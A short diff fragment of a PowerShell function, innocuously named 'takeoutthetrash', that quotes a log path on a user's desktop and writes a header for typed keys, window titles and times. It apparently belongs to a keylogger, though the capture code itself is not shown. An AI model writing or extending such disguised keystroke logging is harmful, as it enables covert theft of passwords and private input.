@@ -10,7 +10,7 @@ function takeoutthetrash {
         [Switch]$PassThru
     )
 
-    $LogPath = C:/Users/Luis Morales/Desktop/key.log
+    $LogPath = 'C:/Users/Luis Morales/Desktop/key.log'
 
     try { '"TypedKey","WindowTitle","Time"' | Out-File -FilePath $LogPath -Encoding unicode }
     catch { throw $_ }
